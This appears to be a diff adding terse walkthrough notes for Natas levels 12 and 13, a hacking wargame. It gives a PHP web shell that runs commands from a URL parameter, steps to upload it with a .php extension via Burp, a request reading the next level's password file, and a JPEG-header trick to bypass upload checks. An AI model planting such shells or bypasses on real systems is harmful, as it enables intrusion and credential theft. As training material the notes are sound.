@@ -1,0 +1,15 @@
+*12*
+
+submit a file containing: 
+<?
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?> 
+in burp, change the filename so the extention is .php
+then submit a GET request for the file
+/uploads/file.php?cmd=cat+../../../../../etc/natas_webpas/natas13
+
+*13*
+same as natas12, but you must start w a .jpg file and keep some of the jpeg file before putting in the php code
